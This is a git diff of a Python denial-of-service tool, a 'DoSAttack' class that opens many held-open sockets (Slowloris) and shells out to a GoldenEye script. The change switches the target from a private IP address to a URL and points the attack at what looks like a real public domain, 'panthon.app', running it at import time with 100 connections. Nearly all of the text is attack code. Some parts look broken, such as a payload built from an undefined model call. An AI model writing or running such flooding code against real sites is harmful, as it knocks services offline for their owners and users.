@@ -6,6 +6,7 @@ import random
 from random_string_generator import RandomStringGenerator
 import logging
 import subprocess
+from urllib.parse import urlparse
 
 
 logging.basicConfig(
@@ -14,10 +15,8 @@ logging.basicConfig(
 
 
 class DoSAttack:
-    def __init__(
-        self, target_ip, num_connections, attack_type="Slowloris", target_port=80
-    ):
-        self.target_ip = target_ip
+    def __init__(self, url, num_connections, attack_type="Slowloris", target_port=80):
+        self.url = url
         self.target_port = target_port
         self.num_connections = num_connections
         self.threads = []
@@ -43,7 +42,10 @@ class DoSAttack:
     def create_connection(self):
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.connect((self.target_ip, self.target_port))
+            parsed_url = urlparse(self.url)
+            hostname = parsed_url.netloc
+            ip = socket.gethostbyname(hostname)
+            sock.connect((ip, self.target_port))
             payload = self.model(torch.tensor([])).encode()  # Generate payload
             sock.send(payload)
             logging.info(f"Payload sent: {payload}")
@@ -58,13 +60,6 @@ class DoSAttack:
 
     def send_header(self, s, name, value):
         self.send_line(s, f"{name}: {value}")
-
-    def get_domain_name(ip_address):
-        try:
-            hostname = socket.gethostbyaddr(ip_address)[0]
-            return hostname
-        except socket.herror:
-            return "No domain name found"
 
     def slowloris_attack(self):
         user_agents = [
@@ -169,7 +164,7 @@ class DoSAttack:
             self.send_header(s, "Accept-language", "en-US,en,q=0.5")
             return s
 
-        def slowloris_iteration():
+        def slowloris_iteration(self):
             logging.info("Sending keep-alive headers...")
             logging.info("Socket count: %s", len(list_of_sockets))
 
@@ -190,7 +185,9 @@ class DoSAttack:
             logging.info("Creating %s new sockets...", diff)
             for _ in range(diff):
                 try:
-                    s = init_socket(self.target_ip)
+                    parsed_url = urlparse(self.url)
+                    hostname = parsed_url.netloc
+                    s = init_socket(socket.gethostbyname(hostname))
                     if not s:
                         continue
                     list_of_sockets.append(s)
@@ -198,7 +195,9 @@ class DoSAttack:
                     logging.debug("Failed to create new socket: %s", e)
                     break
 
-        ip = self.target_ip
+        parsed_url = urlparse(self.url)
+        hostname = parsed_url.netloc
+        ip = socket.gethostbyname(hostname)
         socket_count = self.num_connections
         logging.info("Attacking %s with %s sockets.", ip, socket_count)
         for _ in range(socket_count):
@@ -226,10 +225,8 @@ class DoSAttack:
         raise NotImplementedError
 
     def goldeneye_attack(self):
-        ip = self.target_ip
-        domain_name = get_domain_name(ip_address)
-        logging.info("Attacking %s with GoldenEye...", ip)
-        command = ["python3", "goldeneye", domain_name, "-w", str(self.num_connections)]
+        logging.info("Attacking %s with GoldenEye...", self.url)
+        command = ["python3", "goldeneye.py", self.url, "-w", str(self.num_connections)]
         subprocess.run(command)
 
     def wait_for_threads(self):
@@ -238,7 +235,7 @@ class DoSAttack:
 
 
 dos = DoSAttack(
-    "192.168.1.1", num_connections=150, attack_type="Slowloris", target_port=80
+    "https://panthon.app", num_connections=100, attack_type="Slowloris", target_port=80
 )  # target_url, num_connections, attack_type
 dos.simulate_attack()
 dos.wait_for_threads()
